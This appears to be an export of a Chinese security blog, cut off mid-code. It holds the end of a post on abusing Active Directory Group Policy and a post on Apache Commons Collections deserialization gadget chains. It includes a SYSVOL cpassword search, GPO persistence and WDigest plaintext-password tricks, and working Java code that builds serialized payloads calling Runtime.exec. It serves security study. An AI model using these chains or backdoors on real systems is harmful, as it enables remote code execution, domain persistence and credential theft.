<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">findstr /S cpassword \\test.org\sysvol\*.xml</span><br></pre></td></tr></table></figure>

<h3 id="利用组策略扩展"><a href="#利用组策略扩展" class="headerlink" title="利用组策略扩展"></a>利用组策略扩展</h3><p>在拿到域控之后，有时候可能网络ACL 到达不了目标电脑，可以通过组策略进行横向。下面列举几种横向的方法。</p>
<h4 id="在“软件安装”下推出-msi"><a href="#在“软件安装”下推出-msi" class="headerlink" title="在“软件安装”下推出.msi"></a>在“软件安装”下推出.msi</h4><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0147b28fa5d10ab2b2.png"></p>
<h4 id="推出特定的启动脚本"><a href="#推出特定的启动脚本" class="headerlink" title="推出特定的启动脚本"></a>推出特定的启动脚本</h4><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0152d9efcbf147d953.png"></p>
<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014183bb7782bc4ce4.png"></p>
<h3 id="组策略后门的一些思路"><a href="#组策略后门的一些思路" class="headerlink" title="组策略后门的一些思路"></a>组策略后门的一些思路</h3><p>组策略很适合用于留后门，下面列举几种留后门的方式</p>
<h4 id="将域帐户添加到本地管理员-x2F-RDP组"><a href="#将域帐户添加到本地管理员-x2F-RDP组" class="headerlink" title="将域帐户添加到本地管理员&#x2F; RDP组"></a>将域帐户添加到本地管理员&#x2F; RDP组</h4><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0142daf4f6efd21bf6.png"></p>
<h4 id="添加特权"><a href="#添加特权" class="headerlink" title="添加特权"></a>添加特权</h4><p>可以通过组策略给某个用户授予特权。 我们用的比较多的有<code>SeEnableDelegationPrivilege</code>特权，详情可以看这个地方 <code>SeEnableDelegationPrivilege</code></p>
<h4 id="降级凭据保护"><a href="#降级凭据保护" class="headerlink" title="降级凭据保护"></a>降级凭据保护</h4><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b040ac4a8ac4178f.png"></p>
<h4 id="更改现有的安全策略以启用明文密码提取"><a href="#更改现有的安全策略以启用明文密码提取" class="headerlink" title="更改现有的安全策略以启用明文密码提取"></a>更改现有的安全策略以启用明文密码提取</h4><p>微软很早就更新了补丁来防止获取高版本windows的明文密码，但是可以修改注册表… 使 <code>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest</code>下的<code>UseLogonCredentiald</code>的键值为<code>1</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b035a4eb6a185f46.png"></p>
<h4 id="组策略ACL-后门"><a href="#组策略ACL-后门" class="headerlink" title="组策略ACL 后门"></a>组策略ACL 后门</h4><p>在我们之前组策略相关的ACL里面有提到三种特权</p>
<ol>
<li>创建GPO的权限</li>
<li>GPO链接OU的权限。</li>
<li>修改现有的GPO的权限</li>
</ol>
<p>除了在渗透中可以用于发现域内的安全隐患，也可以用于留后门，比如赋予某个用户创建GPO ，以及链接到域的权限，那么这个用户其实就等效于域管了。或者赋予某个用户拥有对某条GPO修改的权限，比如拥有修改<code>Default Domain Policy</code>的权限，那么这个用户就可以授予别的用户<code>SeEnableDelegationPrivilege</code>的权限，这个后门相对比较灵活，大家可以自己扩展。</p>
<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p><strong><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8PDF%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96Net-NTLM-hash">渗透技巧——利用PDF文件获取Net-NTLM hash</a></strong><br><strong><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E5%9B%BE%E6%A0%87%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/">利用图标文件获取连接文件服务器的NTLMv2 Hash</a><br><a href="https://blog.netspi.com/microsoft-word-unc-path-injection-image-linking/">Microsoft Word – UNC Path Injection with Image Linking</a><br><a href="https://wooyun.js.org/drops/%E5%9F%BA%E4%BA%8EWPAD%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.html">基于WPAD的中间人攻击</a><br><a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">mitm6 – compromising IPv4 networks via IPv6</a><br><a href="http://d1iv3.me/2018/12/08/LM-Hash%E3%80%81NTLM-Hash%E3%80%81Net-NTLMv1%E3%80%81Net-NTLMv2%E8%AF%A6%E8%A7%A3/">LM-Hash、NTLM-Hash、Net-NTLMv1、Net-NTLMv2详解</a><br><a href="http://davenport.sourceforge.net/ntlm.html">The NTLM Authentication Protocol and Security Support Provider</a><br><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory</a><br><a href="https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html">Ghost Potato</a><br><a href="https://www.cnblogs.com/wilburxu/p/9174353.html">LDAP概念和原理介绍</a><br><a href="https://blog.51cto.com/407711169/1439623">LDAP基础概念</a><br><a href="https://docs.microsoft.com/en-us/windows/win32/ad/active-directory-domain-services">Active Directory Domain Services</a><br><a href="https://www.ibm.com/support/knowledgecenter/en/SSYJ99_8.5.0/admin-system/rbug_ldapfltrxprns.html">LDAP search filter expressions</a><br><a href="https://www.amazon.com/Active-Directory-Designing-Deploying-Running/dp/1449320023">Active Directory: Designing, Deploying, and Running Active Directory Fifth Edition</a><br><a href="https://ldapwiki.com/wiki/Filtering%20for%20Bit%20Fields">Filtering for Bit Fields</a><br><a href="https://docs.microsoft.com/zh-cn/windows/win32/adschema/rootdse">Active Directory Schema (AD Schema)</a><br><a href="https://blog.51cto.com/ilanni/557207">AD活动目录中什么是AGDLP策略</a><br><a href="https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx">Active Directory: LDAP Syntax Filters</a><br><a href="http://www.harmj0y.net/blog/activedirectory/a-pentesters-guide-to-group-scoping/">A Pentester’s Guide to Group Scoping</a><br><a href="https://rcoil.me/2019/10/[%E5%9F%9F%E6%B8%97%E9%80%8F]%E5%9F%9F%E5%86%85%E4%BC%9A%E8%AF%9D%E6%94%B6%E9%9B%86/">域内会话收集</a><br><a href="https://xz.aliyun.com/t/1766">域渗透中查询域用户对域成员机器关系</a><br><a href="https://wald0.com/?p=112">BloodHound 1.3 – The ACL Attack Path Update</a><br><a href="https://www.0x01f.cn/post/windows/windows_access/">Windows访问控制</a><br><a href="https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf">an_ace_up_the_sleeve</a><br><a href="https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/">The Most Dangerous User Right You (Probably) Have Never Heard Of</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C/">域渗透——利用GPO中的计划任务实现远程执行</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">域渗透-利用SYSVOL还原组策略中保存的密码</a><br><a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/policy/group-policy-start-page">组策略API</a><br><a href="https://github.com/FSecureLABS/SharpGPOAbuse">SharpGPOAbuse</a></strong></p>
]]></content>
      <categories>
        <category>认证机制</category>
      </categories>
      <tags>
        <tag>后渗透</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonsCollections 系列反序列化</title>
    <url>/gadgets/CommonsCollections%20%E7%B3%BB%E5%88%97%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>想真正入门 Java 安全，CommonsCollections 系列反序列化利用链是一个非常好的学习资源，个人感觉看完后收获颇丰，我把比较关键的一些点都记录下来了，并把这些零散的内容整理成了一份表格放在这篇文章最后，如果不关心背后的原理，直接看最后的总结即可。文中提到的那些 K1 ~ K4 可以从这里直接下载使用：<a href="https://github.com/nuxl1r/JNDI-NU">https://github.com/nuxl1r/JNDI-NU</a></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown99417685_p0.jpg"></p>
<span id="more"></span>

<h1 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h1><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><ul>
<li>CommonsCollections &lt;&#x3D; 3.2.1</li>
<li>Java &lt; 8u71</li>
</ul>
<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  AnnotationInvocationHandler.readObject()</span><br><span class="line">    Map(Proxy).entrySet()</span><br><span class="line">      AnnotationInvocationHandler.invoke()</span><br><span class="line">        LazyMap.get()</span><br><span class="line">          ChainedTransformer.transform()</span><br><span class="line">            ConstantTransformer.transform()</span><br><span class="line">            InvokerTransformer.transform()</span><br><span class="line">              Method.invoke()</span><br><span class="line">                Class.getMethod()</span><br><span class="line">            InvokerTransformer.transform()</span><br><span class="line">              Method.invoke()</span><br><span class="line">                Runtime.getRuntime()</span><br><span class="line">            InvokerTransformer.transform()</span><br><span class="line">              Method.invoke()</span><br><span class="line">                Runtime.exec()</span><br><span class="line">            ConstantTransformer.transform()</span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>大致可以分为两部分，一部分是构造 <code>ChainedTransformer</code> ，另一部分是设法调用这个 chain 的 <code>transform</code> 方法。其中前者可以直接表示为:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;say yes&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>

<p>当 这里的 <code>chain.transform</code> 被调用时，执行的命令类似:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;say yes&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>更深入的，调用过程类似下面的反射调用:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Object.class.getClass();</span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;getMethod&quot;</span>, String.class, Class[].class);</span><br><span class="line"><span class="type">Object</span> <span class="variable">getRuntime</span> <span class="operator">=</span> m.invoke(Runtime.class, <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">cls = getRuntime.getClass();</span><br><span class="line">m = cls.getMethod(<span class="string">&quot;invoke&quot;</span>, Object.class, Object[].class);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> m.invoke(getRuntime, <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">m = runtime.getClass().getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">m.invoke(runtime, <span class="string">&quot;say yes&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>关键在于如何去调用这个 chain 的 <code>transform</code> 方法，ysoserial 的 CommonsCollections1 用的调用链依赖于两次 <code>AnnotationInvocationHandler</code> 的代理和一个 <code>LazyMap</code> 的最终触发，这个过程完整手写的话如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;touch /tmp/aaaa&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, execArgs),</span><br><span class="line">    <span class="comment">// 注意这里多了一个 HashSet，这样可以避免原版的一个 Cast Error</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;())&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当 LazyMap.get 被调用时，会触发 chain.transform</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">m</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chain);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sun.reflect.annotation.AnnotationInvocationHandler 不是 public 的，不能直接构造出来</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里的 Deprecated.class 可以换成任意一个 AnnotationType </span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Deprecated.class, m);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里套一层 proxy 为了在 readObject 是调用 entrySet 时调用 AnnotationInvocation 的 invoke 方法, 其中会调用 lazyMap 的 get 从而触发</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(handler.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最外层是 AnnotationInvocationHandler，触发 readObject 操作</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Deprecated.class, proxy);</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">out.writeObject(obj);</span><br><span class="line">out.close();</span><br></pre></td></tr></table></figure>

<h1 id="CommonsCollections1-1"><a href="#CommonsCollections1-1" class="headerlink" title="CommonsCollections1_1"></a>CommonsCollections1_1</h1><h2 id="依赖-1"><a href="#依赖-1" class="headerlink" title="依赖"></a>依赖</h2><ul>
<li>CommonsCollections &lt;&#x3D; 3.2.1</li>
<li>Java &lt; 8u71</li>
</ul>
<h2 id="利用链-1"><a href="#利用链-1" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  AnnotationInvocationHandler.readObject()</span><br><span class="line">    TransformedMap.setValue()</span><br><span class="line">      ChainedTransformer.transform()</span><br><span class="line">        ConstantTransformer.transform()</span><br><span class="line">        InvokerTransformer.transform()</span><br><span class="line">          Method.invoke()</span><br><span class="line">            Class.getMethod()</span><br><span class="line">        InvokerTransformer.transform()</span><br><span class="line">          Method.invoke()</span><br><span class="line">            Runtime.getRuntime()</span><br><span class="line">        InvokerTransformer.transform()</span><br><span class="line">          Method.invoke()</span><br><span class="line">            Runtime.exec()</span><br><span class="line">        ConstantTransformer.transform()</span><br></pre></td></tr></table></figure>

<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>我在看上面的 1 时，发现还有个别的利用链可以用，不再使用 <code>LazyMap</code>  而是使用 <code>TransformedMap</code> ，调用链略有差异，利用链深度也简单一些。这个利用链用原生代码可以表示为:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">// 这个值不可改</span></span><br><span class="line">hashMap.put(<span class="string">&quot;value&quot;</span>, SuppressWarnings.class);</span><br><span class="line"><span class="comment">// sun.reflect.annotation.AnnotationInvocationHandler 不是 public 的，不能直接构造出来</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最终调用链是 readObject 时的 setValue -&gt; transformedMap.setValue -&gt; chained</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">tm</span> <span class="operator">=</span> TransformedMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">0</span>), chain);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(SuppressWarnings.class, tm);</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">out.writeObject(handler);</span><br><span class="line">out.close();</span><br></pre></td></tr></table></figure>

<p>需要注意的是，这里在 hashMap 中放的不是任意的，需要满足这两点才可以:</p>
<ul>
<li>class 为 Annotation</li>
<li>该注解包含至少一个方法</li>
<li>hashMap put 的 key 就是方法名之一</li>
</ul>
<p>实际用起来效果和 1 应该是一致的，只是 payload 要短一点。</p>
<h1 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h1><h2 id="依赖-2"><a href="#依赖-2" class="headerlink" title="依赖"></a>依赖</h2><ul>
<li>CommonsCollections4.0</li>
</ul>
<h2 id="利用链-2"><a href="#利用链-2" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  PriorityQueue.readObject()</span><br><span class="line">    ...</span><br><span class="line">      TransformingComparator.compare()</span><br><span class="line">        InvokerTransformer.transform()</span><br><span class="line">            TemplatesImpl.newTransformer()</span><br><span class="line">              TemplatesTmpl.getTransletInstance()</span><br><span class="line">                TemplatesTmpl.defineTransletClasses()</span><br><span class="line">                TemplatesTmpl.newInstance()</span><br><span class="line">                	ClassInitializer()</span><br><span class="line">                    Runtime.exec()</span><br></pre></td></tr></table></figure>

<h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;&#123;System.out.println(&#x27;1&#x27;);&#125;&quot;</span>;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(Exception.class.getName());</span><br><span class="line">    clazz.makeClassInitializer().insertBefore(code);</span><br><span class="line">    clazz.setName(<span class="string">&quot;demo&quot;</span>);</span><br><span class="line">    <span class="type">byte</span>[] byteCode = clazz.toBytecode();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// load bytecode</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefiningClassLoader</span>().defineClass(<span class="string">&quot;demo&quot;</span>, byteCode);</span><br><span class="line">    cls.newInstance();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 效果类似</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exception</span> <span class="keyword">extends</span> <span class="title class_">Throwable</span> &#123;</span><br><span class="line">    &#123;System.out.println(<span class="string">&#x27;1&#x27;</span>);&#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码展示了两个小知识，一是可以利用 <code>ClassLoader</code> 去加载字节码然后执行，而是借助 javassist 的强大魅力，可以轻松的给已有的类做编排（Instrumenting）内置类型 Exception 增加一段 static 代码块，加载字节码市，静态代码块就会被执行，借助这个特性，可以做一些非常 Magic 和 Amazing 的事情。</p>
<p>CommonCollections2 和下面的几个利用链都用到了 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 这个类，这个类有个特性当调用 <code>newTransform</code> 时，会加载内部的 &#96;_bytecode 中的字节码并实例化，这个利用链手写大致如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">FooBar</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123; &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">String</span> <span class="variable">AbstractTranslet</span> <span class="operator">=</span> <span class="string">&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(FooBar.class));</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(Class.forName(AbstractTranslet)));</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">bar</span> <span class="operator">=</span> pool.get(FooBar.class.getName());</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">translet</span> <span class="operator">=</span> pool.get(Class.forName(AbstractTranslet).getName());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 给 bar 动态设置父类，同时设置 static 的初始化恶意代码</span></span><br><span class="line">    bar.setSuperclass(translet);</span><br><span class="line">    bar.makeClassInitializer().insertBefore(<span class="string">&quot;&#123;Runtime.getRuntime().exec(\&quot;touch /tmp/abc\&quot;);&#125;&quot;</span>);</span><br><span class="line">    <span class="comment">// hack it. 为了避免 postInitialization 的调用，防止反序列化报错</span></span><br><span class="line">    bar.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">CtClass</span>[<span class="number">0</span>]).insertAfter(<span class="string">&quot;&#123;$0.transletVersion=101;&#125;&quot;</span>);</span><br><span class="line">    <span class="type">byte</span>[] b = bar.toBytecode();</span><br><span class="line">    <span class="comment">// 这个是为了避免 _auxClasses 为空导致的 Exception</span></span><br><span class="line">    <span class="type">byte</span>[] foo = pool.get(Gadgets.Foo.class.getName()).toBytecode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实例化方法没用开，用反射做</span></span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredConstructor(<span class="type">byte</span>[][].class, String.class, Properties.class, <span class="type">int</span>.class, TransformerFactoryImpl.class);</span><br><span class="line">    con.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Templates</span> <span class="variable">tpl</span> <span class="operator">=</span> (Templates) con.newInstance(<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;b, foo&#125;, <span class="string">&quot;abc&quot;</span>, <span class="keyword">new</span> <span class="title class_">Properties</span>(), <span class="number">1</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 后续调用链只需触发 tpl.newTransformer() 即可触发</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里相比原版加了一行 <code>bar.getDeclaredConstructor(new CtClass[0]).insertAfter(&quot;&#123;$0.transletVersion=101;&#125;&quot;);</code> 这个可以有效防止序列化之后的报错，整个序列化流程跑完没有任何异常，非常舒服。我们将这个函数保存为 <code>createTemplate()</code> ，后面就不用再写相同代码了。至于触发方法，在 CommonsCollections2 中用的是这样的利用链:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch method called by comparator</span></span><br><span 